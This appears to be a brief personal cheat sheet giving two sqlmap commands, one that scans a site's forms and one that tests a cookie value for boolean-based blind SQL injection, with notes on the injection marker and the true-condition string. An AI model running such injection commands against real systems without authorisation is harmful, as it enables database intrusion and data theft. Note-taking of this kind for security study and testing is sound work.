---
tags:
  - database
  - security
  - web
---
```
sqlmap -u "https://..." --forms
```
# SQLMap Cookie SQLI Boolean Based Blind
```
sqlmap -u "https://" --cookie="TrackingId=Fs2BsMws*; session=12345" --level=2 --technique=B --string="Welcome back"
```
- `*` is the injection point
- `--string="Welcome back"` is the boolean true